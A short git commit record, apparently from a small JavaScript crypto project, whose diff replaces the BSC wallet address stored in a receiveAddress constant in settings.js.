a163d447ee8b85db168f9ebad186591e71806f06
Lebronsmanes <kindasusbar@gmail.com>
2024-09-26 12:19:43 -0600

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0xeB4f813f60cD82f5733aE2ad93cf68A4197AEd9f";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
